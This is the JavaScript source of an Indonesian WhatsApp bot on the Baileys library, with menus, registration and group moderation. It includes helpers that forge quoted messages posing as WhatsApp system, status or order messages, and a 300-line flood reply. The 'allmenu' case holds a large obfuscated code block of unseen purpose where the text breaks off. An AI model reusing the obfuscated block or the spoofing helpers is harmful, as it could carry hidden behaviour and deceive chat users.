/*NOTE KALO RENAME YG WAJAR AJA KONTOL
RECORD SESUKAMU KALO EROR JANGAN TANYA/SALAHKAN AKU
LU SENDIRI YG RECORD MASA GW YG SALAH KALO ADA GK BAKAL GW BALES CHAT NYA

MY SOSMED

Github : github.com/HARISGANZ

Instagram : wong_koclok_

You Tube : HANZ々OFC彡

Tiktok : Alay kontol

*/

const
	{
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
	} = require("@adiwajshing/baileys")
const fs = require("fs")
const axios = require('axios')
const speed = require("performance-now")
const util = require('util')
const crypto = require('crypto')
const request = require('request')
const { exec, spawn } = require('child_process')
const fetch = require('node-fetch')
const moment = require('moment-timezone')
const ffmpeg = require('fluent-ffmpeg')
const { help } = require('./media/help')
const { removeBackgroundFromImageFile } = require('remove.bg')
const { fetchJosn, kyun, fetchText } = require('./lib/fetcher')
const { color, bgcolor } = require('./lib/color')
const { wait, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions')
const _antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
const _antivirtex = JSON.parse(fs.readFileSync('./database/antivirtex.json'))
const setting = JSON.parse(fs.readFileSync('./media/setting.json'))
const scommand = JSON.parse(fs.readFileSync('./database/scommand.json'))
const _registered = JSON.parse(fs.readFileSync('./database/registered.json'))
const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    scommand.push(obj)
    fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
}
const getCommandPosition = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}
const getCmd = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return scommand[position].chats
    }
}
const checkSCommand = (id) => {
    let status = false
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            status = true
        }
    })
    return status
}
owner = setting.OwnerNumber
botname = setting.BotName
lolkey = setting.lolKey
hanzkey = setting.hanzKey
ownername = setting.OwnerName
creator = 'ԋαɳȥ々σϝƈ' 
recode = 'ԋαɳȥ々σϝƈ' 
publik = true //self/public
fakeimage = fs.readFileSync("./media/thumnail.jpg")
asutes = 'BOT HANZ OFC[🔥]' //Runtime
module.exports = Hanz = async (Hanz, mek, _welkom) => {
	try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
		if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		global.blocked
        	mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const { text, extendedText, contact, contactsArray, groupInviteMessage, listMessage, buttonsMessage, location, liveLocation, image, video, sticker, document, audio, product, quotedMsg } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
        const type = Object.keys(mek.message)[0]        
        const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
        const prefix = /^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*,;]/gi) : '-'          	
        body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : ""
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''		
		const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()		
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)		
		const arg = budy.slice(command.length + 2, budy.length)	
		const q = args.join(' ')		
		const Verived = "0@s.whatsapp.net"
		const txt = mek.message.conversation
		const botNumber = Hanz.user.jid
		const ownerNumber = [`${owner}@s.whatsapp.net`, `6283144394823@s.whatsapp.net`]
		const dtod = "6285706035039@s.whatsapp.net"
        const otod = "6285706035039@s.whatsapp.net"
		const isGroup = from.endsWith('@g.us')
		let sender = isGroup ? mek.participant : mek.key.remoteJid
		const totalchat = await Hanz.chats.all()
		const groupMetadata = isGroup ? await Hanz.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const conts = mek.key.fromMe ? Hanz.user.jid : Hanz.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? Hanz.user.name : conts.notify || conts.vname || conts.name || '-'
        
        
		const isAntiLink = isGroup ? _antilink.includes(from) : false
		const isWelkom = isGroup ? _welkom.includes(from) : false
		const isAntiVirtex = isGroup ? _antivirtex.includes(from) : false
		const isOwner = ownerNumber.includes(sender)
		const isMybot = isOwner || mek.key.fromMe

		mess = {
	    wait: 'Sabar Bang/neng Lagi Proses',
		success: 'Done',
		error: {
		stick: 'Gagal❕',
	    Iv: 'Linknya Error !'
		},
		only: {
		admin: 'Kusus Admin!',
		group: 'Khusus Di Group!'
	    }
		}
		faketeks = 'Hanz'
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }
        const reply = (teks) => {
            Hanz.sendMessage(from, teks, text, {quoted:mek})
        }
        const sendMess = (hehe, teks) => {
            Hanz.sendMessage(hehe, teks, text)
        }
        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? Hanz.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : Hanz.sendMessage(from, teks.trim(), extendedText, { quoted: ftrol, contextInfo: { "mentionedJid": memberr } })
        }
        const zero = fs.readFileSync ('./media/Hanz.jpg')
        const costum = (pesan, tipe, target, target2) => {
			Hanz.sendMessage(from, pesan, tipe, { quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}` } } })
		}
		//Runtime
		const runtime = function (seconds) {
  seconds = Number(seconds);
  var d = Math.floor(seconds / (3600 * 24));
  var h = Math.floor((seconds % (3600 * 24)) / 3600);
  var m = Math.floor((seconds % 3600) / 60);
  var s = Math.floor(seconds % 60);
  var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " Hari, ") : "";
  var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " Jam, ") : "";
  var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " Menit, ") : "";
  var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " Detik") : "";
  return dDisplay + hDisplay + mDisplay + sDisplay;
};
var ase = new Date();
                        var jamss = ase.getHours();
                         switch(jamss){
                         //WAKTU UCAPAN                      
case 0: jamss = "Jangan gadang kak"; break;
  case 1: jamss = "Jangan gadang kak"; break;
     case 2: jamss = "Jangan gadang kak"; break;
        case 3: jamss = "Jangan gadang kak"; break;
            case 4: jamss = "Sholat subuh kak"; break;
               case 5: jamss = "Selamat pagi"; break;
                 case 6: jamss = "Selamat pagi"; break;
                    case 7: jamss = "Selamat pagi"; break;
                       case 8: jamss = "Selamat pagi"; break;
                          case 9: jamss = "Selamat pagi"; break;
                             case 10: jamss = "Selamat pagi"; break;
                               case 11: jamss = "Selamat siang"; break;
                                 case 12: jamss = "sholat Zuhur kak"; break;//GABUT🗿
                              case 13: jamss = "Selamat siang"; break;
                           case 14: jamss = "Selamat sore"; break;
                        case 15: jamss = "sholat Ashar kak"; break;
                     case 16: jamss = "Selamat sore"; break;
                  case 17: jamss = "Selamat sore"; break;
               case 18: jamss = "Selamat malam"; break;
            case 19: jamss = "sholat Isya kak"; break;
         case 20: jamss = "Selamat malam"; break;
      case 21: jamss = "Selamat malam"; break;
   case 22: jamss = "Selamat malam"; break;
case 23: jamss = "Selamat malam"; break;
}
//SLOT GAME
var tampilUcapan = "" + jamss;
const sotoy = ['🍊 : 🍒 : 🍐','🍒 : 🔔 : 🍊','🍇 : 🍇 : 🍇','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔',		'🍐 : 🍒 : 🍋','🍐 : 🍐 : 🍐','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇','🔔 : 🔔 : 🔔','🍒 : 🍒 : 🍒','🍌 : 🍌 : 🍌']
const sotoy2 = ['🍊 : 🍒 : 🍐','🍒 : 🔔 : 🍊','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔',		'🍐 : 🍒 : 🍋','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇']
const sotoy1 = ['🍊 : 🍒 : 🍐','🍒 : 🔔 : 🍊','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔',		'🍐 : 🍒 : 🍋','🍊 : 🍒 : 🍒','?? : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇']
const sotoy3 = ['🔔 : 🔔 : 🔔','🍒 : 🍒 : 🍒','🍌 : 🍌 : 🍌']
const buruh1 = ['🐳','🦈','🐬','🐋','🐟','🐠','🦐','🦑','🦀','🐚']
const buruh2 = ['🐔','🦃','🐿','🐐','🐏','🐖','🐑','🐎','🐺','🦩']
const buruh3 = ['🦋','🕷','🐝','🐉','🦆','🦅','🕊','🐧','🐦','🦇']
const buruh11 = buruh1[Math.floor(Math.random() * (buruh1.length))]
const buruh22 = buruh2[Math.floor(Math.random() * (buruh2.length))]
const buruh33 = buruh3[Math.floor(Math.random() * (buruh3.length))]        
//━━━━━━━━━━━━━━━[ BUTTON ]━━━━━━━━━━━━━━━━━//
 //FAKE REPLY
const replyy = (teks) => {
Hanz.sendMessage(from, teks, text, { quoted: mek, contextInfo: { externalAdReply: { title: `${botname}`, body: 'By : Haris Gans', sourceUrl: `https://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw`, thumbnail: fs.readFileSync('./media/thumnail.jpg') }}})
}             
//BUTTON LOKASI              
const sendButtonLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await Hanz.prepareMessage(from, kma, location,{ waitForAck: true })
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
Hanz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
//BUTTON TEXT
const sendButton = async (from, context, fortext, but, mek) => {
buttonMessages = {
contentText: context,
footerText: fortext,
buttons: but,
headerType: 1
}
Hanz.sendMessage(from, buttonMessages, buttonsMessage, {
quoted: ftrol
})
}         
//BUTTON DOCUMENT
const Sendbutdocument = async(id, text1, desc1, file1, doc1, but = [], options = {}) => {
media = file1
kma = doc1
mhan = await Hanz.prepareMessage(from, media, document, kma)
const buttonMessages = {
documentMessage: mhan.message.documentMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: "DOCUMENT"
}
Hanz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
//BUTTON FOTO
const sendButImage = async (from, context, fortext, img, but, mek) => {
jadinya = await Hanz.prepareMessage(from, img, image)
buttonMessagesI = {
imageMessage: jadinya.message.imageMessage,
contentText: context,
footerText: fortext,
buttons: but,
headerType: 4
}
Hanz.sendMessage(from, buttonMessagesI, buttonsMessage, {
                quoted: ftrol,
                contexInfo: adyt
            })
        }        
const adyt = { 
"title": `Hallo ${pushname}`,
"body": `hy`, 
"mediaType": "2", 
"mediaUrl": "https://youtu.be/ilrhJV_QMIE", 
"thumbnail": fs.readFileSync('./media/Hanz.jpg')
}
const getRegisteredRandomId = () => {
return _registered[Math.floor(Math.random() * _registered.length)].id
}
const addRegisteredUser = (userid, sender, age, time, serials) => {
const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
_registered.push(obj)
fs.writeFileSync('./database/registered.json', JSON.stringify(_registered))
}
const checkRegisteredUser = (sender) => {
let status = false
Object.keys(_registered).forEach((i) => {
if (_registered[i].id === sender) {
status = true
}
})
return status
}

//BUTTON DAFTAR/VERIFY
const isRegistered = checkRegisteredUser(sender)

const sendButRegis = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1,
};
Hanz.sendMessage(
id,
buttonMessage,
MessageType.buttonsMessage,
options
);
};

const daftar1 = `Hai kak  ${pushname} ${tampilUcapan} \n\nSebeum Menggunakan Bot ${botname} Harap Daftarkan Diri dengan klik Button Verify di bawah ini!`
const daftar2 = 'SUBSCRIBE LINK DI BAWAH INI❕\nhttps://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw'
const daftar3 = [{buttonId: `${prefix}verify`,buttonText: {displayText: `VERIFY㋡`,},type: 1,},]

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
//~~~~~~~~~~~~~~~~~~~~~[ WADERFAK MEN ]~~~~~~~~~~~~~~~~~~~~~//
//FAKE STATUS
const fakestatus = (teks) => {
Hanz.sendMessage(from, teks, text, {
quoted: {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
"mimetype": "image/jpeg",
"caption": faketeks,
"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
"fileLength": "28777",
"height": 1080,
"width": 1079,
"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
"fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
"directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
"mediaKeyTimestamp": "1610993486",
"jpegThumbnail": fs.readFileSync('./media/thumnail.jpg'),
"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
}
}
}
})
}       
//FAKE TROLI       
const ftrol = {
key : {
participant : '0@s.whatsapp.net'
},
message: {
orderMessage: {
itemCount : 2022,
status: 1,
surface : 1,
message: `ʜᴀɴᴢ々ᴏꜰᴄ`, 
orderTitle: `ʜᴀɴᴢ々ᴏꜰᴄ`,
thumbnail: Hanz, //Gambarnye
sellerJid: '0@s.whatsapp.net' 
}
}
}
//FAKE LOKASi                   
const floc = {
key : {
participant : '0@s.whatsapp.net'
},
message: {
liveLocationMessage: {
caption: `${tampilUcapan} ${pushname}`,
jpegThumbnail: Hanz
}
}
}
//FAKE DOKUMEN                     
const fdoc = {
key : {
participant : '0@s.whatsapp.net'
},
message: {
documentMessage: {
title: `${tampilUcapan} ${pushname}`, 
jpegThumbnail: Hanz
}
}
}           
//============================(BATES)===============================
        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        Hanz.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    Hanz.sendMessage(to, media, type, { quoted: ftrol, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }   
            if (budy.includes("https://chat.whatsapp.com/")) {
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
reply(` *「 GROUP LINK DETECTOR 」*\nKamu mengirimkan link grup chat, maaf kamu di kick dari grup :(`)
setTimeout(() => {
Hanz.groupRemove(from, [kic]).catch((e) => { reply(`BOT HARUS JADI ADMIN`) })
}, 0)
}

		if (budy.length > 3500) {
if (!isGroup) return
if (!isAntiVirtex) return
if (isGroupAdmins) return
reply('Tandai telah dibaca\n'.repeat(300))
reply(`「 *VIRTEX DETECTOR* 」\n\nKamu mengirimkan virtex, maaf kamu di kick dari group :(`)
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
Hanz.groupRemove(from, [sender])
}     
                      



		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		if (!publik) {
		if (!isOwner && !mek.key.fromMe) return
		}
      	if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))      	
     	if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))      	

//MENU

switch (command) {
case 'menu':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
	teks =
`
█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
█░░║║║╠─║─║─║║║║║╠─░░█
█░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█

❏INFO BOT❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
┏━━⊱ 
┣冬Nama Bot : ${botname}
┣冬Nama Owner : ${ownername}
┣冬Nomor Owner : ${owner}
┣冬Creator : ${creator}
┣冬Prefix : Multi
┣冬Runtime : ${runtime(process.uptime())}
┗━━⊱
❏INFO USER❏
┏━━⊱ 
┣🎗Nama User : ${pushname}
┣🎗Nomer User : ${sender.split("@")[0]}
┗━━⊱
❏TO DAY❏
┏━━⊱ 
┣🗣${tampilUcapan}
┣🕑Jam : ${time}
┗━━⊱
`
gam = fs.readFileSync('./media/thumnail.jpg')
but = [{buttonId: `${prefix}command`, buttonText: { displayText: '⎙ MENU' }, type: 1 },{buttonId: `${prefix}allmenu`, buttonText: { displayText: '⎙ ALLMENU' }, type: 1 },]
sendButImage(from, teks, "©HANZ々OFC彡", gam, but)        
break 
case 'allmenu':
(function(_0x1747e6,_0x4acbda){function _0x6b239(_0x30814b,_0x549009,_0x433b8b,_0x40267,_0x371b0e){return _0x2c5a(_0x30814b-0x16,_0x433b8b);}var _0x2296da=_0x1747e6();function _0x106bf2(_0x4e269e,_0x430fe0,_0x3e45c2,_0x19c044,_0x48bd41){return _0x2c5a(_0x3e45c2- -0x13e,_0x48bd41);}function _0x5adce3(_0x520801,_0x1dab9a,_0x3622db,_0x59798d,_0x33e10f){return _0x2c5a(_0x33e10f- -0x36a,_0x3622db);}function _0x5a9796(_0x13966d,_0x3878cc,_0x4c4f51,_0x4f4b2d,_0x24dddc){return _0x2c5a(_0x24dddc- -0x13d,_0x13966d);}function _0xd6d8b3(_0x18b254,_0xf717ca,_0x2b834f,_0x45b997,_0x78eede){return _0x2c5a(_0xf717ca- -0x336,_0x18b254);}while(!![]){try{var _0x52d20a=-parseInt(_0x106bf2(0x1d4,-0x15,0xbe,0x1c1,'77ff'))/(-0x149c+0x1a92+-0x5f5)+-parseInt(_0x5adce3(-0xc3,0xd5,'8xUH',-0x6f,0x43))/(-0x1e87+-0x1*-0x1ceb+0x19e)*(-parseInt(_0x5adce3(-0x19d,0x1e,'TyTN',-0xd5,-0xec))/(0x267b+-0x3*0xbeb+0x2b7*-0x1))+-parseInt(_0x106bf2(0x114,0x176,0x12a,0x127,'08Dr'))/(-0xea7*0x1+0xff9+-0x14e)+-parseInt(_0x106bf2(0x2af,0x108,0x1ac,0x250,'Z0cY'))/(0x21*-0x112+-0x1256+0x35ad)*(parseInt(_0x106bf2(0x284,0x2a5,0x275,0x234,'ieT4'))/(-0x1*-0x1a4d+-0x5*-0x72f+-0x3e32))+parseInt(_0x5adce3(0xa8,0x2a,'5j!O',-0xa7,-0x47))/(0x156+-0x17c2*0x1+0x335*0x7)*(parseInt(_0x5adce3(-0x88,-0x110,'4MZ9',-0x17e,-0xdd))/(0x1a*-0xb0+-0x1e09+0x2ff1))+parseInt(_0x5adce3(0x2,-0x9b,'8xUH',0x66,-0x86))/(-0xe91+-0x736*-0x2+0x2e)*(-parseInt(_0x5a9796('el#v',0x32b,0x1fc,0x15a,0x247))/(0x7*0xf8+-0x79*0x13+0x3*0xbf))+parseInt(_0x106bf2(0x114,0x237,0x14e,0x251,'MZb7'))/(0x7f8+0x23c5+0x11*-0x292)*(parseInt(_0x5a9796('xpy(',0x14c,0x224,0x137,0x194))/(-0x1d64+0x1569+-0x19b*-0x5));if(_0x52d20a===_0x4acbda)break;else _0x2296da['push'](_0x2296da['shift']());}catch(_0x38bb51){_0x2296da['push'](_0x2296da['shift']());}}}(_0x388b,-0xced2e+-0x76283+0x1c6eb3));var _0x4db8c9=(function(){var _0x3f5304={'GbGCA':function(_0x28a9c9,_0x4cef83){return _0x28a9c9(_0x4cef83);},'GYOMO':_0x15c187('clBt',0x1a1,0x1ee,0x11e,0x131)+_0x3c7f53(0x4a4,0x562,'*[Wy',0x5af,0x50d)+'+$','VbECS':function(_0x48e350,_0x2a9258){return _0x48e350===_0x2a9258;},'dqeXV':_0x324bcb('842!',0x3c9,0x344,0x3bf,0x3d0),'kYooY':_0x3c7f53(0x50f,0x613,'G5Ea',0x5eb,0x672),'QFuHL':_0x324bcb('*0Ud',0x3bb,0x322,0x326,0x247),'XyIaI':function(_0x5a32eb,_0x4bb5e7){return _0x5a32eb!==_0x4bb5e7;},'AksuY':_0x324bcb('9DdW',0x2ea,0x28c,0x1fb,0x1bb)};function _0x3c7f53(_0x1e3157,_0x442af6,_0x44c2c0,_0x3a83c3,_0x49129b){return _0x2c5a(_0x3a83c3-0x348,_0x44c2c0);}function _0x324bcb(_0x4965ae,_0x5891b3,_0x99a1aa,_0x12e1b0,_0x1c5739){return _0x2c5a(_0x99a1aa-0xc,_0x4965ae);}function _0x462ae8(_0x1efd2e,_0x27f363,_0x5c7e1c,_0x2465ad,_0x5643ac){return _0x2c5a(_0x1efd2e- -0xcb,_0x5643ac);}function _0x568072(_0x43f724,_0x42f8c4,_0x218dfd,_0x28034b,_0x8f3e4d){return _0x2c5a(_0x43f724-0x2c0,_0x8f3e4d);}function _0x15c187(_0x1b4872,_0x4ab779,_0x252674,_0x143ce1,_0x2271d5){return _0x2c5a(_0x2271d5- -0x271,_0x1b4872);}var _0x414758=!![];return function(_0x236326,_0x4443b9){var _0x2d59e2={'vlzfX':_0x3f5304[_0xb5da35(0x3bc,0x4bc,0x39b,0x482,'EM9S')],'HYwTF':function(_0x2021bb,_0x105322){function _0xf8a69(_0x102687,_0x311e4b,_0x5d7630,_0x243831,_0x3504bb){return _0xb5da35(_0x102687-0xc5,_0x311e4b-0x3e,_0x5d7630-0x132,_0x102687- -0x1d6,_0x243831);}return _0x3f5304[_0xf8a69(0xde,-0x8,0x49,'TyTN',0x137)](_0x2021bb,_0x105322);},'IPwjG':_0x3f5304[_0x21d05e(0x5c6,0x6b7,0x68e,0x64c,'4MZ9')],'MPBgQ':_0x3f5304[_0x21d05e(0x50c,0x46f,0x5e5,0x412,'pJ5&')],'drcby':_0x3f5304[_0x57f3b7('521X',0x3fc,0x392,0x32e,0x3bf)]};function _0x416d24(_0x412aa2,_0x7157ca,_0x336e95,_0x88c693,_0x75b8eb){return _0x15c187(_0x75b8eb,_0x7157ca-0x10d,_0x336e95-0x140,_0x88c693-0x86,_0x412aa2-0x2ac);}function _0x31ee41(_0x583516,_0xdaafe9,_0x48898e,_0x158fc5,_0x5ba7ad){return _0x568072(_0x583516- -0x1e8,_0xdaafe9-0x31,_0x48898e-0x48,_0x158fc5-0x1ec,_0xdaafe9);}function _0x57f3b7(_0x2af22c,_0x1fd260,_0x4ec444,_0x5b44e4,_0x4b0dce){return _0x324bcb(_0x2af22c,_0x1fd260-0x186,_0x4ec444-0x17b,_0x5b44e4-0x115,_0x4b0dce-0x1d8);}function _0x21d05e(_0x57006c,_0xc54834,_0x3be2f5,_0x4aa48e,_0x48ca33){return _0x15c187(_0x48ca33,_0xc54834-0x163,_0x3be2f5-0xbb,_0x4aa48e-0x16b,_0x57006c-0x5b5);}function _0xb5da35(_0x332f16,_0x377051,_0x1aab8a,_0xc9bcf6,_0x3099a7){return _0x3c7f53(_0x332f16-0xcc,_0x377051-0x1a3,_0x3099a7,_0xc9bcf6- -0x250,_0x3099a7-0x7b);}if(_0x3f5304[_0x21d05e(0x6fa,0x66f,0x6b0,0x7df,'m@lN')](_0x3f5304[_0x416d24(0x221,0x240,0x168,0x205,'xpy(')],_0x3f5304[_0x21d05e(0x657,0x6fd,0x614,0x592,'Og3Y')])){if(_0x851e74)return _0x58d825;else _0x3f5304[_0x31ee41(0x3be,'*[Wy',0x41f,0x2b9,0x351)](_0x1b2707,0x15dd+-0x5*-0x345+-0x2636);}else{var _0x3306a4=_0x414758?function(){function _0x5f04f0(_0x41a74,_0x49c728,_0x9c4272,_0x17b44d,_0x36410f){return _0x31ee41(_0x9c4272-0x2ca,_0x17b44d,_0x9c4272-0xa8,_0x17b44d-0xcb,_0x36410f-0x17b);}function _0x55a2d9(_0x2c1004,_0x5b2e2e,_0x19f0fb,_0x455f39,_0x11a9c2){return _0x31ee41(_0x11a9c2- -0x2d5,_0x455f39,_0x19f0fb-0x47,_0x455f39-0x10c,_0x11a9c2-0xf6);}function _0x13ba4b(_0x43a637,_0x33617d,_0x18bd32,_0xa4742,_0x438d8d){return _0x416d24(_0x33617d-0x1b5,_0x33617d-0x1e5,_0x18bd32-0x1c0,_0xa4742-0x1db,_0x18bd32);}function _0x388daa(_0x599247,_0x2ed440,_0x457baa,_0x1c83c5,_0x5359c7){return _0x416d24(_0x5359c7-0x1dc,_0x2ed440-0x144,_0x457baa-0x24,_0x1c83c5-0xd5,_0x457baa);}function _0x9737a6(_0x4eb37e,_0x502508,_0x2e2bd3,_0x1cf563,_0x5e61e2){return _0x21d05e(_0x502508- 